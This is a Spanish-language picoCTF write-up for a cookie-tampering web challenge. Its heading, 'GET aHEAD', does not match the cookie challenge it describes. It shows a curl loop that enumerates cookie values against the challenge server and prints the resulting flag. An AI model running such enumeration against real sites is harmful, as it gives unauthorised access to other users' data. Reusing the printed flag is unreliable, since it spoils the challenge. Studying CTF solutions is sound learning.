# USERNAME -> amcdanymx

# GET aHEAD


## Description

Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:64944/](http://mercury.picoctf.net:64944/)

## Pistas

- (None)


## Solución

Ingresamos al sitio web, de entrada sabemos que el reto tiene que ver con las cookies, vemos que el sitio contiene varias cookies
Usando la extensión de "editor de cookies"podemos ir cambiando el valor de cookies y en respuesta nos van cabiando las frases del sitio web.
- Vamos a probar hacer algo en consola:

```

amcdanymx@kali ~
$ for i in {0..20}; do curl -s http://mercury.picoctf.net:64944/check -H "Cookie: name=$i"; done | grep picoCTF

         <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}</code></p>

```

Lo que hicimos fue automatizar el proceso del cambio del valor de la cookie, así podemos llegar a donde se encuentre la bandera.